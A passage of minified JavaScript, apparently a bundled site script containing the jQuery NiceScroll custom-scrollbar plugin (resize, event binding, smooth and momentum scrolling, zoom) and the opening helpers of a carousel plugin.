i=_.hasreversehr?_.scrollvaluemaxw-_.scroll.x:_.scroll.x;!_.rail.align&&_.rail.visibility?_.cursorh.css({width:_.cursorwidth,left:i+_.rail.width}):_.cursorh.css({width:_.cursorwidth,left:i}),_.cursoractive=!0}_.zoom&&_.zoom.stop().css({opacity:_.opt.cursoropacitymax})}},this.hideCursor=function(t){_.cursortimeout||_.rail&&_.autohidedom&&(_.hasmousefocus&&"leave"==_.opt.autohidemode||(_.cursortimeout=setTimeout((function(){_.rail.active&&_.showonmouseevent||(_.autohidedom.stop().animate({opacity:_.opt.cursoropacitymin}),_.zoom&&_.zoom.stop().animate({opacity:_.opt.cursoropacitymin}),_.cursoractive=!1),_.cursortimeout=0}),t||_.opt.hidecursordelay)))},this.noticeCursor=function(t,e,i){_.showCursor(e,i),_.rail.active||_.hideCursor(t)},this.getContentSize=_.ispage?function(){return{w:Math.max(document.body.scrollWidth,document.documentElement.scrollWidth),h:Math.max(document.body.scrollHeight,document.documentElement.scrollHeight)}}:_.haswrapper?function(){return{w:_.doc.outerWidth()+parseInt(_.win.css("paddingLeft"))+parseInt(_.win.css("paddingRight")),h:_.doc.outerHeight()+parseInt(_.win.css("paddingTop"))+parseInt(_.win.css("paddingBottom"))}}:function(){return{w:_.docscroll[0].scrollWidth,h:_.docscroll[0].scrollHeight}},this.onResize=function(t,e){if(!_||!_.win)return!1;if(!_.haswrapper&&!_.ispage){if("none"==_.win.css("display"))return _.visibility&&_.hideRail().hideRailHr(),!1;_.hidden||_.visibility||_.showRail().showRailHr()}var i=_.page.maxh,o=_.page.maxw,n=_.view.h,s=_.view.w;if(_.view={w:_.ispage?_.win.width():parseInt(_.win[0].clientWidth),h:_.ispage?_.win.height():parseInt(_.win[0].clientHeight)},_.page=e||_.getContentSize(),_.page.maxh=Math.max(0,_.page.h-_.view.h),_.page.maxw=Math.max(0,_.page.w-_.view.w),_.page.maxh==i&&_.page.maxw==o&&_.view.w==s&&_.view.h==n){if(_.ispage)return _;var r=_.win.offset();if(_.lastposition){var a=_.lastposition;if(a.top==r.top&&a.left==r.left)return _}_.lastposition=r}return 0==_.page.maxh?(_.hideRail(),_.scrollvaluemax=0,_.scroll.y=0,_.scrollratio.y=0,_.cursorheight=0,_.setScrollTop(0),_.rail&&(_.rail.scrollable=!1)):(_.page.maxh-=_.opt.railpadding.top+_.opt.railpadding.bottom,_.rail.scrollable=!0),0==_.page.maxw?(_.hideRailHr(),_.scrollvaluemaxw=0,_.scroll.x=0,_.scrollratio.x=0,_.cursorwidth=0,_.setScrollLeft(0),_.railh&&(_.railh.scrollable=!1)):(_.page.maxw-=_.opt.railpadding.left+_.opt.railpadding.right,_.railh&&(_.railh.scrollable=_.opt.horizrailenabled)),_.railslocked=_.locked||0==_.page.maxh&&0==_.page.maxw,_.railslocked?(_.ispage||_.updateScrollBar(_.view),!1):(_.hidden||_.visibility?!_.railh||_.hidden||_.railh.visibility||_.showRailHr():_.showRail().showRailHr(),_.istextarea&&_.win.css("resize")&&"none"!=_.win.css("resize")&&(_.view.h-=20),_.cursorheight=Math.min(_.view.h,Math.round(_.view.h*(_.view.h/_.page.h))),_.cursorheight=_.opt.cursorfixedheight?_.opt.cursorfixedheight:Math.max(_.opt.cursorminheight,_.cursorheight),_.cursorwidth=Math.min(_.view.w,Math.round(_.view.w*(_.view.w/_.page.w))),_.cursorwidth=_.opt.cursorfixedheight?_.opt.cursorfixedheight:Math.max(_.opt.cursorminheight,_.cursorwidth),_.scrollvaluemax=_.view.h-_.cursorheight-_.cursor.hborder-(_.opt.railpadding.top+_.opt.railpadding.bottom),_.railh&&(_.railh.width=_.page.maxh>0?_.view.w-_.rail.width:_.view.w,_.scrollvaluemaxw=_.railh.width-_.cursorwidth-_.cursorh.wborder-(_.opt.railpadding.left+_.opt.railpadding.right)),_.ispage||_.updateScrollBar(_.view),_.scrollratio={x:_.page.maxw/_.scrollvaluemaxw,y:_.page.maxh/_.scrollvaluemax},_.getScrollTop()>_.page.maxh?_.doScrollTop(_.page.maxh):(_.scroll.y=Math.round(_.getScrollTop()*(1/_.scrollratio.y)),_.scroll.x=Math.round(_.getScrollLeft()*(1/_.scrollratio.x)),_.cursoractive&&_.noticeCursor()),_.scroll.y&&0==_.getScrollTop()&&_.doScrollTo(Math.floor(_.scroll.y*_.scrollratio.y)),_)},this.resize=_.onResize,this.lazyResize=function(t){return t=isNaN(t)?30:t,_.debounced("resize",_.resize,t),_},this.jqbind=function(t,e,i){_.events.push({e:t,n:e,f:i,q:!0}),r(t).bind(e,i)},this.bind=function(t,e,i,o){var n="jquery"in t?t[0]:t;if("mousewheel"==e)if("onwheel"in _.win)_._bind(n,"wheel",i,o||!1);else{var s=void 0!==document.onmousewheel?"mousewheel":"DOMMouseScroll";f(n,s,i,o||!1),"DOMMouseScroll"==s&&f(n,"MozMousePixelScroll",i,o||!1)}else if(n.addEventListener){if(b.cantouch&&/mouseup|mousedown|mousemove/.test(e)){var r="mousedown"==e?"touchstart":"mouseup"==e?"touchend":"touchmove";_._bind(n,r,(function(t){if(t.touches)t.touches.length<2&&((e=t.touches.length?t.touches[0]:t).original=t,i.call(this,e));else if(t.changedTouches){var e;(e=t.changedTouches[0]).original=t,i.call(this,e)}}),o||!1)}_._bind(n,e,i,o||!1),b.cantouch&&"mouseup"==e&&_._bind(n,"touchcancel",i,o||!1)}else _._bind(n,e,(function(t){return(t=t||window.event||!1)&&t.srcElement&&(t.target=t.srcElement),"pageY"in t||(t.pageX=t.clientX+document.documentElement.scrollLeft,t.pageY=t.clientY+document.documentElement.scrollTop),!1!==i.call(n,t)&&!1!==o||_.cancelEvent(t)}))},b.haseventlistener?(this._bind=function(t,e,i,o){_.events.push({e:t,n:e,f:i,b:o,q:!1}),t.addEventListener(e,i,o||!1)},this.cancelEvent=function(t){return!!t&&((t=t.original?t.original:t).preventDefault(),t.stopPropagation(),t.preventManipulation&&t.preventManipulation(),!1)},this.stopPropagation=function(t){return!!t&&((t=t.original?t.original:t).stopPropagation(),!1)},this._unbind=function(t,e,i,o){t.removeEventListener(e,i,o)}):(this._bind=function(t,e,i,o){_.events.push({e:t,n:e,f:i,b:o,q:!1}),t.attachEvent?t.attachEvent("on"+e,i):t["on"+e]=i},this.cancelEvent=function(t){return!!(t=window.event||!1)&&(t.cancelBubble=!0,t.cancel=!0,t.returnValue=!1,!1)},this.stopPropagation=function(t){return!!(t=window.event||!1)&&(t.cancelBubble=!0,!1)},this._unbind=function(t,e,i,o){t.detachEvent?t.detachEvent("on"+e,i):t["on"+e]=!1}),this.unbindAll=function(){for(var t=0;t<_.events.length;t++){var e=_.events[t];e.q?e.e.unbind(e.n,e.f):_._unbind(e.e,e.n,e.f,e.b)}},this.showRail=function(){return 0==_.page.maxh||!_.ispage&&"none"==_.win.css("display")||(_.visibility=!0,_.rail.visibility=!0,_.rail.css("display","block")),_},this.showRailHr=function(){return _.railh?(0==_.page.maxw||!_.ispage&&"none"==_.win.css("display")||(_.railh.visibility=!0,_.railh.css("display","block")),_):_},this.hideRail=function(){return _.visibility=!1,_.rail.visibility=!1,_.rail.css("display","none"),_},this.hideRailHr=function(){return _.railh?(_.railh.visibility=!1,_.railh.css("display","none"),_):_},this.show=function(){return _.hidden=!1,_.railslocked=!1,_.showRail().showRailHr()},this.hide=function(){return _.hidden=!0,_.railslocked=!0,_.hideRail().hideRailHr()},this.toggle=function(){return _.hidden?_.show():_.hide()},this.remove=function(){_.stop(),_.cursortimeout&&clearTimeout(_.cursortimeout),_.debouncedelayed&&clearTimeout(_.debouncedelayed),_.doZoomOut(),_.unbindAll(),b.isie9&&_.win[0].detachEvent("onpropertychange",_.onAttributeChange),!1!==_.observer&&_.observer.disconnect(),!1!==_.observerremover&&_.observerremover.disconnect(),!1!==_.observerbody&&_.observerbody.disconnect(),_.events=null,_.cursor&&_.cursor.remove(),_.cursorh&&_.cursorh.remove(),_.rail&&_.rail.remove(),_.railh&&_.railh.remove(),_.zoom&&_.zoom.remove();for(var t=0;t<_.saved.css.length;t++){var e=_.saved.css[t];e[0].css(e[1],void 0===e[2]?"":e[2])}_.saved=!1,_.me.data("__nicescroll","");var i=r.nicescroll;for(var o in i.each((function(t){if(this&&this.id===_.id){delete i[t];for(var e=++t;e<i.length;e++,t++)i[t]=i[e];i.length--,i.length&&delete i[i.length]}})),_)_[o]=null,delete _[o];_=null},this.scrollstart=function(t){return this.onscrollstart=t,_},this.scrollend=function(t){return this.onscrollend=t,_},this.scrollcancel=function(t){return this.onscrollcancel=t,_},this.zoomin=function(t){return this.onzoomin=t,_},this.zoomout=function(t){return this.onzoomout=t,_},this.isScrollable=function(t){var e=t.target?t.target:t;if("OPTION"==e.nodeName)return!0;for(;e&&1==e.nodeType&&!/^BODY|HTML/.test(e.nodeName);){var i=r(e),o=i.css("overflowY")||i.css("overflowX")||i.css("overflow")||"";if(/scroll|auto/.test(o))return e.clientHeight!=e.scrollHeight;e=!!e.parentNode&&e.parentNode}return!1},this.getViewport=function(t){for(var e=!(!t||!t.parentNode)&&t.parentNode;e&&1==e.nodeType&&!/^BODY|HTML/.test(e.nodeName);){var i=r(e);if(/fixed|absolute/.test(i.css("position")))return i;var o=i.css("overflowY")||i.css("overflowX")||i.css("overflow")||"";if(/scroll|auto/.test(o)&&e.clientHeight!=e.scrollHeight)return i;if(i.getNiceScroll().length>0)return i;e=!!e.parentNode&&e.parentNode}return!1},this.triggerScrollEnd=function(){if(_.onscrollend){var t=_.getScrollLeft(),e=_.getScrollTop(),i={type:"scrollend",current:{x:t,y:e},end:{x:t,y:e}};_.onscrollend.call(_,i)}},this.onmousewheel=function(t){if(!_.wheelprevented){if(_.railslocked)return _.debounced("checkunlock",_.resize,250),!0;if(_.rail.drag)return _.cancelEvent(t);if("auto"==_.opt.oneaxismousemode&&0!=t.deltaX&&(_.opt.oneaxismousemode=!1),_.opt.oneaxismousemode&&0==t.deltaX&&!_.rail.scrollable)return!_.railh||!_.railh.scrollable||_.onmousewheelhr(t);var e=+new Date,i=!1;if(_.opt.preservenativescrolling&&_.checkarea+600<e&&(_.nativescrollingarea=_.isScrollable(t),i=!0),_.checkarea=e,_.nativescrollingarea)return!0;var o=g(t,!1,i);return o&&(_.checkarea=0),o}},this.onmousewheelhr=function(t){if(!_.wheelprevented){if(_.railslocked||!_.railh.scrollable)return!0;if(_.rail.drag)return _.cancelEvent(t);var e=+new Date,i=!1;return _.opt.preservenativescrolling&&_.checkarea+600<e&&(_.nativescrollingarea=_.isScrollable(t),i=!0),_.checkarea=e,!!_.nativescrollingarea||(_.railslocked?_.cancelEvent(t):g(t,!0,i))}},this.stop=function(){return _.cancelScroll(),_.scrollmon&&_.scrollmon.stop(),_.cursorfreezed=!1,_.scroll.y=Math.round(_.getScrollTop()*(1/_.scrollratio.y)),_.noticeCursor(),_},this.getTransitionSpeed=function(t){var e=Math.round(10*_.opt.scrollspeed),i=Math.min(e,Math.round(t/20*_.opt.scrollspeed));return i>20?i:0},_.opt.smoothscroll?_.ishwscroll&&b.hastransition&&_.opt.usetransition&&_.opt.smoothscroll?(this.prepareTransition=function(t,e){var i=e?t>20?t:0:_.getTransitionSpeed(t),o=i?b.prefixstyle+"transform "+i+"ms ease-out":"";return _.lasttransitionstyle&&_.lasttransitionstyle==o||(_.lasttransitionstyle=o,_.doc.css(b.transitionstyle,o)),i},this.doScrollLeft=function(t,e){var i=_.scrollrunning?_.newscrolly:_.getScrollTop();_.doScrollPos(t,i,e)},this.doScrollTop=function(t,e){var i=_.scrollrunning?_.newscrollx:_.getScrollLeft();_.doScrollPos(i,t,e)},this.doScrollPos=function(t,e,i){var o=_.getScrollTop(),n=_.getScrollLeft();return((_.newscrolly-o)*(e-o)<0||(_.newscrollx-n)*(t-n)<0)&&_.cancelScroll(),0==_.opt.bouncescroll&&(0>e?e=0:e>_.page.maxh&&(e=_.page.maxh),0>t?t=0:t>_.page.maxw&&(t=_.page.maxw)),(!_.scrollrunning||t!=_.newscrollx||e!=_.newscrolly)&&(_.newscrolly=e,_.newscrollx=t,_.newscrollspeed=i||!1,!_.timer&&void(_.timer=setTimeout((function(){var i=_.getScrollTop(),o=_.getScrollLeft(),n={};n.x=t-o,n.y=e-i,n.px=o,n.py=i;var s=Math.round(Math.sqrt(Math.pow(n.x,2)+Math.pow(n.y,2))),r=_.newscrollspeed&&_.newscrollspeed>1?_.newscrollspeed:_.getTransitionSpeed(s);if(_.newscrollspeed&&_.newscrollspeed<=1&&(r*=_.newscrollspeed),_.prepareTransition(r,!0),_.timerscroll&&_.timerscroll.tm&&clearInterval(_.timerscroll.tm),r>0){if(!_.scrollrunning&&_.onscrollstart){var a={type:"scrollstart",current:{x:o,y:i},request:{x:t,y:e},end:{x:_.newscrollx,y:_.newscrolly},speed:r};_.onscrollstart.call(_,a)}b.transitionend?_.scrollendtrapped||(_.scrollendtrapped=!0,_.bind(_.doc,b.transitionend,_.onScrollTransitionEnd,!1)):(_.scrollendtrapped&&clearTimeout(_.scrollendtrapped),_.scrollendtrapped=setTimeout(_.onScrollTransitionEnd,r));var l=i,c=o;_.timerscroll={bz:new x(l,_.newscrolly,r,0,0,.58,1),bh:new x(c,_.newscrollx,r,0,0,.58,1)},_.cursorfreezed||(_.timerscroll.tm=setInterval((function(){_.showCursor(_.getScrollTop(),_.getScrollLeft())}),60))}_.synched("doScroll-set",(function(){_.timer=0,_.scrollendtrapped&&(_.scrollrunning=!0),_.setScrollTop(_.newscrolly),_.setScrollLeft(_.newscrollx),_.scrollendtrapped||_.onScrollTransitionEnd()}))}),50)))},this.cancelScroll=function(){if(!_.scrollendtrapped)return!0;var t=_.getScrollTop(),e=_.getScrollLeft();return _.scrollrunning=!1,b.transitionend||clearTimeout(b.transitionend),_.scrollendtrapped=!1,_._unbind(_.doc[0],b.transitionend,_.onScrollTransitionEnd),_.prepareTransition(0),_.setScrollTop(t),_.railh&&_.setScrollLeft(e),_.timerscroll&&_.timerscroll.tm&&clearInterval(_.timerscroll.tm),_.timerscroll=!1,_.cursorfreezed=!1,_.showCursor(t,e),_},this.onScrollTransitionEnd=function(){_.scrollendtrapped&&_._unbind(_.doc[0],b.transitionend,_.onScrollTransitionEnd),_.scrollendtrapped=!1,_.prepareTransition(0),_.timerscroll&&_.timerscroll.tm&&clearInterval(_.timerscroll.tm),_.timerscroll=!1;var t=_.getScrollTop(),e=_.getScrollLeft();return _.setScrollTop(t),_.railh&&_.setScrollLeft(e),_.noticeCursor(!1,t,e),_.cursorfreezed=!1,0>t?t=0:t>_.page.maxh&&(t=_.page.maxh),0>e?e=0:e>_.page.maxw&&(e=_.page.maxw),t!=_.newscrolly||e!=_.newscrollx?_.doScrollPos(e,t,_.opt.snapbackspeed):(_.onscrollend&&_.scrollrunning&&_.triggerScrollEnd(),void(_.scrollrunning=!1))}):(this.doScrollLeft=function(t,e){var i=_.scrollrunning?_.newscrolly:_.getScrollTop();_.doScrollPos(t,i,e)},this.doScrollTop=function(t,e){var i=_.scrollrunning?_.newscrollx:_.getScrollLeft();_.doScrollPos(i,t,e)},this.doScrollPos=function(t,e,i){e=void 0===e||!1===e?_.getScrollTop(!0):e;if(_.timer&&_.newscrolly==e&&_.newscrollx==t)return!0;_.timer&&c(_.timer),_.timer=0;var o=_.getScrollTop(),n=_.getScrollLeft();((_.newscrolly-o)*(e-o)<0||(_.newscrollx-n)*(t-n)<0)&&_.cancelScroll(),_.newscrolly=e,_.newscrollx=t,_.bouncescroll&&_.rail.visibility||(_.newscrolly<0?_.newscrolly=0:_.newscrolly>_.page.maxh&&(_.newscrolly=_.page.maxh)),_.bouncescroll&&_.railh.visibility||(_.newscrollx<0?_.newscrollx=0:_.newscrollx>_.page.maxw&&(_.newscrollx=_.page.maxw)),_.dst={},_.dst.x=t-n,_.dst.y=e-o,_.dst.px=n,_.dst.py=o;var s=Math.round(Math.sqrt(Math.pow(_.dst.x,2)+Math.pow(_.dst.y,2)));_.dst.ax=_.dst.x/s,_.dst.ay=_.dst.y/s;var r=0,a=s;0==_.dst.x?(r=o,a=e,_.dst.ay=1,_.dst.py=0):0==_.dst.y&&(r=n,a=t,_.dst.ax=1,_.dst.px=0);var p=_.getTransitionSpeed(s);if(i&&1>=i&&(p*=i),_.bzscroll=p>0&&(_.bzscroll?_.bzscroll.update(a,p):new x(r,a,p,0,1,0,1)),!_.timer){(o==_.page.maxh&&e>=_.page.maxh||n==_.page.maxw&&t>=_.page.maxw)&&_.checkContentSize();var u=1;if(_.cancelAnimationFrame=!1,_.timer=1,_.onscrollstart&&!_.scrollrunning){var d={type:"scrollstart",current:{x:n,y:o},request:{x:t,y:e},end:{x:_.newscrollx,y:_.newscrolly},speed:p};_.onscrollstart.call(_,d)}(function t(){if(_.cancelAnimationFrame)return!0;if(_.scrollrunning=!0,u=1-u)return _.timer=l(t)||1;var e,i,o=0,n=i=_.getScrollTop();_.dst.ay?((0>(s=(n=_.bzscroll?_.dst.py+_.bzscroll.getNow()*_.dst.ay:_.newscrolly)-i)&&n<_.newscrolly||s>0&&n>_.newscrolly)&&(n=_.newscrolly),_.setScrollTop(n),n==_.newscrolly&&(o=1)):o=1;var s,r=e=_.getScrollLeft();_.dst.ax?((0>(s=(r=_.bzscroll?_.dst.px+_.bzscroll.getNow()*_.dst.ax:_.newscrollx)-e)&&r<_.newscrollx||s>0&&r>_.newscrollx)&&(r=_.newscrollx),_.setScrollLeft(r),r==_.newscrollx&&(o+=1)):o+=1,2==o?(_.timer=0,_.cursorfreezed=!1,_.bzscroll=!1,_.scrollrunning=!1,0>n?n=0:n>_.page.maxh&&(n=_.page.maxh),0>r?r=0:r>_.page.maxw&&(r=_.page.maxw),r!=_.newscrollx||n!=_.newscrolly?_.doScrollPos(r,n):_.onscrollend&&_.triggerScrollEnd()):_.timer=l(t)||1})(),(o==_.page.maxh&&e>=o||n==_.page.maxw&&t>=n)&&_.checkContentSize(),_.noticeCursor()}},this.cancelScroll=function(){return _.timer&&c(_.timer),_.timer=0,_.bzscroll=!1,_.scrollrunning=!1,_}):(this.doScrollLeft=function(t,e){var i=_.getScrollTop();_.doScrollPos(t,i,e)},this.doScrollTop=function(t,e){var i=_.getScrollLeft();_.doScrollPos(i,t,e)},this.doScrollPos=function(t,e,i){var o=t>_.page.maxw?_.page.maxw:t;0>o&&(o=0);var n=e>_.page.maxh?_.page.maxh:e;0>n&&(n=0),_.synched("scroll",(function(){_.setScrollTop(n),_.setScrollLeft(o)}))},this.cancelScroll=function(){}),this.doScrollBy=function(t,e){var i=0;e?i=Math.floor((_.scroll.y-t)*_.scrollratio.y):i=(_.timer?_.newscrolly:_.getScrollTop(!0))-t;if(_.bouncescroll){var o=Math.round(_.view.h/2);-o>i?i=-o:i>_.page.maxh+o&&(i=_.page.maxh+o)}_.cursorfreezed=!1;var n=_.getScrollTop(!0);return 0>i&&0>=n?_.noticeCursor():i>_.page.maxh&&n>=_.page.maxh?(_.checkContentSize(),_.noticeCursor()):void _.doScrollTop(i)},this.doScrollLeftBy=function(t,e){var i=0;e?i=Math.floor((_.scroll.x-t)*_.scrollratio.x):i=(_.timer?_.newscrollx:_.getScrollLeft(!0))-t;if(_.bouncescroll){var o=Math.round(_.view.w/2);-o>i?i=-o:i>_.page.maxw+o&&(i=_.page.maxw+o)}_.cursorfreezed=!1;var n=_.getScrollLeft(!0);return 0>i&&0>=n||i>_.page.maxw&&n>=_.page.maxw?_.noticeCursor():void _.doScrollLeft(i)},this.doScrollTo=function(t,e){var i=e?Math.round(t*_.scrollratio.y):t;0>i?i=0:i>_.page.maxh&&(i=_.page.maxh),_.cursorfreezed=!1,_.doScrollTop(t)},this.checkContentSize=function(){var t=_.getContentSize();(t.h!=_.page.h||t.w!=_.page.w)&&_.resize(!1,t)},_.onscroll=function(t){_.rail.drag||_.cursorfreezed||_.synched("scroll",(function(){_.scroll.y=Math.round(_.getScrollTop()*(1/_.scrollratio.y)),_.railh&&(_.scroll.x=Math.round(_.getScrollLeft()*(1/_.scrollratio.x))),_.noticeCursor()}))},_.bind(_.docscroll,"scroll",_.onscroll),this.doZoomIn=function(t){if(!_.zoomactive){_.zoomactive=!0,_.zoomrestore={style:{}};var e=["position","top","left","zIndex","backgroundColor","marginTop","marginBottom","marginLeft","marginRight"],i=_.win[0].style;for(var o in e){var n=e[o];_.zoomrestore.style[n]=void 0!==i[n]?i[n]:""}_.zoomrestore.style.width=_.win.css("width"),_.zoomrestore.style.height=_.win.css("height"),_.zoomrestore.padding={w:_.win.outerWidth()-_.win.width(),h:_.win.outerHeight()-_.win.height()},b.isios4&&(_.zoomrestore.scrollTop=r(window).scrollTop(),r(window).scrollTop(0)),_.win.css({position:b.isios4?"absolute":"fixed",top:0,left:0,"z-index":s+100,margin:"0px"});var a=_.win.css("backgroundColor");return(""==a||/transparent|rgba\(0, 0, 0, 0\)|rgba\(0,0,0,0\)/.test(a))&&_.win.css("backgroundColor","#fff"),_.rail.css({"z-index":s+101}),_.zoom.css({"z-index":s+102}),_.zoom.css("backgroundPosition","0px -18px"),_.resizeZoom(),_.onzoomin&&_.onzoomin.call(_),_.cancelEvent(t)}},this.doZoomOut=function(t){return _.zoomactive?(_.zoomactive=!1,_.win.css("margin",""),_.win.css(_.zoomrestore.style),b.isios4&&r(window).scrollTop(_.zoomrestore.scrollTop),_.rail.css({"z-index":_.zindex}),_.zoom.css({"z-index":_.zindex}),_.zoomrestore=!1,_.zoom.css("backgroundPosition","0px 0px"),_.onResize(),_.onzoomout&&_.onzoomout.call(_),_.cancelEvent(t)):void 0},this.doZoom=function(t){return _.zoomactive?_.doZoomOut(t):_.doZoomIn(t)},this.resizeZoom=function(){if(_.zoomactive){var t=_.getScrollTop();_.win.css({width:r(window).width()-_.zoomrestore.padding.w+"px",height:r(window).height()-_.zoomrestore.padding.h+"px"}),_.onResize(),_.setScrollTop(Math.min(_.page.maxh,t))}},this.init(),r.nicescroll.push(this)},v=function(t){var e=this;this.nc=t,this.lastx=0,this.lasty=0,this.speedx=0,this.speedy=0,this.lasttime=0,this.steptime=0,this.snapx=!1,this.snapy=!1,this.demulx=0,this.demuly=0,this.lastscrollx=-1,this.lastscrolly=-1,this.chkx=0,this.chky=0,this.timer=0,this.time=function(){return+new Date},this.reset=function(t,i){e.stop();var o=e.time();e.steptime=0,e.lasttime=o,e.speedx=0,e.speedy=0,e.lastx=t,e.lasty=i,e.lastscrollx=-1,e.lastscrolly=-1},this.update=function(t,i){var o=e.time();e.steptime=o-e.lasttime,e.lasttime=o;var n=i-e.lasty,s=t-e.lastx,r=e.nc.getScrollTop()+n,a=e.nc.getScrollLeft()+s;e.snapx=0>a||a>e.nc.page.maxw,e.snapy=0>r||r>e.nc.page.maxh,e.speedx=s,e.speedy=n,e.lastx=t,e.lasty=i},this.stop=function(){e.nc.unsynched("domomentum2d"),e.timer&&clearTimeout(e.timer),e.timer=0,e.lastscrollx=-1,e.lastscrolly=-1},this.doSnapy=function(t,i){var o=!1;0>i?(i=0,o=!0):i>e.nc.page.maxh&&(i=e.nc.page.maxh,o=!0),0>t?(t=0,o=!0):t>e.nc.page.maxw&&(t=e.nc.page.maxw,o=!0),o?e.nc.doScrollPos(t,i,e.nc.opt.snapbackspeed):e.nc.triggerScrollEnd()},this.doMomentum=function(t){var i=e.time(),o=t?i+t:e.lasttime,n=e.nc.getScrollLeft(),s=e.nc.getScrollTop(),r=e.nc.page.maxh,a=e.nc.page.maxw;e.speedx=a>0?Math.min(60,e.speedx):0,e.speedy=r>0?Math.min(60,e.speedy):0;var l=o&&60>=i-o;(0>s||s>r||0>n||n>a)&&(l=!1);var c=!(!e.speedy||!l)&&e.speedy,p=!(!e.speedx||!l)&&e.speedx;if(c||p){var u=Math.max(16,e.steptime);if(u>50){var d=u/50;e.speedx*=d,e.speedy*=d,u=50}e.demulxy=0,e.lastscrollx=e.nc.getScrollLeft(),e.chkx=e.lastscrollx,e.lastscrolly=e.nc.getScrollTop(),e.chky=e.lastscrolly;var h=e.lastscrollx,f=e.lastscrolly,m=function(){var t=e.time()-i>600?.04:.02;e.speedx&&(h=Math.floor(e.lastscrollx-e.speedx*(1-e.demulxy)),e.lastscrollx=h,(0>h||h>a)&&(t=.1)),e.speedy&&(f=Math.floor(e.lastscrolly-e.speedy*(1-e.demulxy)),e.lastscrolly=f,(0>f||f>r)&&(t=.1)),e.demulxy=Math.min(1,e.demulxy+t),e.nc.synched("domomentum2d",(function(){e.speedx&&(e.nc.getScrollLeft()!=e.chkx&&e.stop(),e.chkx=h,e.nc.setScrollLeft(h));e.speedy&&(e.nc.getScrollTop()!=e.chky&&e.stop(),e.chky=f,e.nc.setScrollTop(f));e.timer||(e.nc.hideCursor(),e.doSnapy(h,f))})),e.demulxy<1?e.timer=setTimeout(m,u):(e.stop(),e.nc.hideCursor(),e.doSnapy(h,f))};m()}else e.doSnapy(e.nc.getScrollLeft(),e.nc.getScrollTop())}},_=t.fn.scrollTop;t.cssHooks.pageYOffset={get:function(t,e,i){var o=r.data(t,"__nicescroll")||!1;return o&&o.ishwscroll?o.getScrollTop():_.call(t)},set:function(t,e){var i=r.data(t,"__nicescroll")||!1;return i&&i.ishwscroll?i.setScrollTop(parseInt(e)):_.call(t,e),this}},t.fn.scrollTop=function(t){if(void 0===t){var e=this[0]&&r.data(this[0],"__nicescroll")||!1;return e&&e.ishwscroll?e.getScrollTop():_.call(this)}return this.each((function(){var e=r.data(this,"__nicescroll")||!1;e&&e.ishwscroll?e.setScrollTop(parseInt(t)):_.call(r(this),t)}))};var y=t.fn.scrollLeft;r.cssHooks.pageXOffset={get:function(t,e,i){var o=r.data(t,"__nicescroll")||!1;return o&&o.ishwscroll?o.getScrollLeft():y.call(t)},set:function(t,e){var i=r.data(t,"__nicescroll")||!1;return i&&i.ishwscroll?i.setScrollLeft(parseInt(e)):y.call(t,e),this}},t.fn.scrollLeft=function(t){if(void 0===t){var e=this[0]&&r.data(this[0],"__nicescroll")||!1;return e&&e.ishwscroll?e.getScrollLeft():y.call(this)}return this.each((function(){var e=r.data(this,"__nicescroll")||!1;e&&e.ishwscroll?e.setScrollLeft(parseInt(t)):y.call(r(this),t)}))};var b=function(t){var e=this;if(this.length=0,this.name="nicescrollarray",this.each=function(t){for(var i=0,o=0;i<e.length;i++)t.call(e[i],o++);return e},this.push=function(t){e[e.length]=t,e.length++},this.eq=function(t){return e[t]},t)for(var i=0;i<t.length;i++){var o=r.data(t[i],"__nicescroll")||!1;o&&(this[this.length]=o,this.length++)}return this};(function(t,e,i){for(var o=0;o<e.length;o++)i(t,e[o])})(b.prototype,["show","hide","toggle","onResize","resize","remove","stop","doScrollPos"],(function(t,e){t[e]=function(){var t=arguments;return this.each((function(){this[e].apply(this,t)}))}})),t.fn.getNiceScroll=function(t){return void 0===t?new b(this):this[t]&&r.data(this[t],"__nicescroll")||!1},t.extend(t.expr[":"],{nicescroll:function(t){return!!r.data(t,"__nicescroll")}}),r.fn.niceScroll=function(t,e){void 0===e&&("object"!=typeof t||"jquery"in t||(e=t,t=!1)),e=r.extend({},e);var i=new b;void 0===e&&(e={}),t&&(e.doc=r(t),e.win=r(this));var o=!("doc"in e);return o||"win"in e||(e.win=r(this)),this.each((function(){var t=r(this).data("__nicescroll")||!1;t||(e.doc=o?r(this):e.doc,t=new g(e,r(this)),r(this).data("__nicescroll",t)),i.push(t)})),1==i.length?i[0]:i},window.NiceScroll={getjQuery:function(){return t}},r.nicescroll||(r.nicescroll=new b,r.nicescroll.options=h)})),function($){function sc_setScroll(t,e,i){return"transition"==i.transition&&"swing"==e&&(e="ease"),{anims:[],duration:t,orgDuration:t,easing:e,startTime:getTime()}}function sc_startScroll(t,e){for(var i=0,o=t.anims.length;o>i;i++){var n=t.anims[i];n&&n[0][e.transition](n[1],t.duration,t.easing,n[2])}}function sc_stopScroll(t,e){is_boolean(e)||(e=!0),is_object(t.pre)&&sc_stopScroll(t.pre,e);for(var i=0,o=t.anims.length;o>i;i++){var n=t.anims[i];n[0].stop(!0),e&&(n[0].css(n[1]),is_function(n[2])&&n[2]())}is_object(t.post)&&sc_stopScroll(t.post,e)}function sc_afterScroll(t,e,i){switch(e&&e.remove(),i.fx){case"fade":case"crossfade":case"cover-fade":case"uncover-fade":t.css("opacity",1),t.css("filter","")}}function sc_fireCallbacks(t,e,i,o,n){if(e[i]&&e[i].call(t,o),n[i].length)for(var s=0,r=n[i].length;r>s;s++)n[i][s].call(t,o);return[]}function sc_fireQueue(t,e,i){return e.length&&(t.trigger(cf_e(e[0][0],i),e[0][1]),e.shift()),e}function sc_hideHiddenItems(t){t.each((function(){var t=$(this);t.data("_cfs_isHidden",t.is(":hidden")).hide()}))}function sc_showHiddenItems(t){t&&t.each((function(){var t=$(this);t.data("_cfs_isHidden")||t.show()}))}function sc_clearTimers(t){return t.auto&&clearTimeout(t.auto),t.progress&&clearInterval(t.progress),t}function sc_mapCallbackArguments(t,e,i,o,n,s,r){return{width:r.width,height:r.height,items:{old:t,skipped:e,visible:i},scroll:{items:o,direction:n,duration:s}}}function sc_getDuration(t,e,i,o){var n=t.duration;return"none"==t.fx?0:("auto"==n?n=e.scroll.duration/e.scroll.items*i:10>n&&(n=o/n),1>n?0:("fade"==t.fx&&(n/=2),Math.round(n)))}function nv_showNavi(t,e,i){var o=is_number(t.items.minimum)?t.items.minimum:t.items.visible+1;if("show"==e||"hide"==e)var n=e;else if(o>e){debug(i,"Not enough items ("+e+" total, "+o+" needed): Hiding navigation.");n="hide"}else n="show";var s="show"==n?"removeClass":"addClass",r=cf_c("hidden",i);t.auto.button&&t.auto.button[n]()[s](r),t.prev.button&&t.prev.button[n]()[s](r),t.next.button&&t.next.button[n]()[s](r),t.pagination.container&&t.pagination.container[n]()[s](r)}function 